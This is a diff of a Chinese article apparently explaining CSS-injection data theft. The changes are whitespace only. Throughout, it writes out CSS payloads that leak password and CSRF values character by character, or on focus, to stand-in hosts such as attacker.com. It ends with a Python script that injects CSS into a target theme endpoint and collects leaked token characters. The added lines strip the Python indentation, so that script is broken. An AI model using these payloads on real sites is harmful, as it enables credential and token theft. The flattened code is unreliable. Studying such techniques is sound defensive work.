@@ -33,12 +33,12 @@ CSS没有文件读取能力，没有网络请求API，但可以利用**浏览器
 ```css
 /* 如果密码输入框的value以'a'开头，触发a.png */
 input[name="password"][value^="a"] {
-  background-image: url('https://attacker.com/exfil/a');
+ background-image: url('https://attacker.com/exfil/a');
 }
 
 /* 如果以'b'开头，触发b.png */
 input[name="password"][value^="b"] {
-  background-image: url('https://attacker.com/exfil/b');
+ background-image: url('https://attacker.com/exfil/b');
 }
 ```
 
@@ -76,7 +76,7 @@ input[name="csrf"][value^="a1"] { background: url(//exfil.com/a1); }
 /* 使用 :has() 选择器（现代浏览器） */
 /* 一次性判断多个字符 */
 html:has(input[name="csrf"][value^="a"]) {
-  --leaked: url(//exfil.com/starts_with_a);
+ --leaked: url(//exfil.com/starts_with_a);
 }
 ```
 
@@ -95,17 +95,17 @@ html:has(input[name="csrf"][value^="a"]) {
 
 ```css
 @font-face {
-  font-family: exfil;
-  src: url('https://attacker.com/char/a');
-  unicode-range: U+0061;  /* 'a' */
+ font-family: exfil;
+ src: url('https://attacker.com/char/a');
+ unicode-range: U+0061; /* 'a' */
 }
 @font-face {
-  font-family: exfil;
-  src: url('https://attacker.com/char/b');
-  unicode-range: U+0062;  /* 'b' */
+ font-family: exfil;
+ src: url('https://attacker.com/char/b');
+ unicode-range: U+0062; /* 'b' */
 }
 span {
-  font-family: exfil;
+ font-family: exfil;
 }
 ```
 
@@ -143,12 +143,12 @@ CSS的伪类可以在特定状态下触发样式变化（包括请求URL）：
 ```css
 /* 用户名输入框选择时触发 */
 input[name="username"]:focus {
-  background: url('https://attacker.com/focus/username');
+ background: url('https://attacker.com/focus/username');
 }
 
 /* 密码输入框获得焦点时触发 */
 input[name="password"]:focus {
-  background: url('https://attacker.com/focus/password');
+ background: url('https://attacker.com/focus/password');
 }
 ```
 
@@ -168,11 +168,11 @@ input[name="password"]:focus {
 /* 利用 input[value^="..."] + 逐字符判断 */
 /* 用户每输入一个字符，触发一个请求 */
 input[name="password"][value^="a"] { 
-  background-image: url('https://attacker.com/key/password/a'); 
+ background-image: url('https://attacker.com/key/password/a'); 
 }
 /* 结合 :focus-within 确保只在用户输入时触发 */
 form:focus-within input[name="password"][value^="a"] { 
-  background-image: url('https://attacker.com/key/password/a'); 
+ background-image: url('https://attacker.com/key/password/a'); 
 }
 ```
 
@@ -182,7 +182,7 @@ form:focus-within input[name="password"][value^="a"] {
 
 ```html
 <style>
-  @import url('https://attacker.com/poll?step=1');
+ @import url('https://attacker.com/poll?step=1');
 </style>
 <!-- 服务端动态生成下一步的CSS规则 -->
 <!-- 攻击者每5秒刷新一次@import，检查新的value值 -->
@@ -202,7 +202,7 @@ https://target.com/page#:~:text=secret_data
 
 ```css
 :target {
-  background-image: url('https://attacker.com/found/secret_data');
+ background-image: url('https://attacker.com/found/secret_data');
 }
 ```
 
@@ -234,26 +234,26 @@ target_css_endpoint = "https://target.com/profile/theme"
 alphabet = "0123456789abcdef"
 
 def inject_css(prefix):
-    rules = []
-    for c in alphabet:
-        rules.append(
-            f'input[name="csrf"][value^="{prefix}{c}"] '
-            f'{{ background-image: url(https://attacker.com/char/{prefix}{c}); }}'
-        )
-    payload = "} " + " ".join(rules) + " /*"
-    requests.post(target_css_endpoint, json={"theme": payload})
+ rules = []
+ for c in alphabet:
+ rules.append(
+ f'input[name="csrf"][value^="{prefix}{c}"] '
+ f'{{ background-image: url(https://attacker.com/char/{prefix}{c}); }}'
+ )
+ payload = "} " + " ".join(rules) + " /*"
+ requests.post(target_css_endpoint, json={"theme": payload})
 
 @app.route('/char/<char>')
 def receive_char(char):
-    global known_prefix
-    known_prefix = char
-    print(f"[+] Leaked: {char}")
-    return "body{}"
+ global known_prefix
+ known_prefix = char
+ print(f"[+] Leaked: {char}")
+ return "body{}"
 
 # 循环注CSS直到完整token泄露
 while len(known_prefix) < 32:
-    inject_css(known_prefix)
-    time.sleep(3)  # 等待CSS加载、浏览器请求
+ inject_css(known_prefix)
+ time.sleep(3) # 等待CSS加载、浏览器请求
 ```
 
 ## 七、实际攻击案例
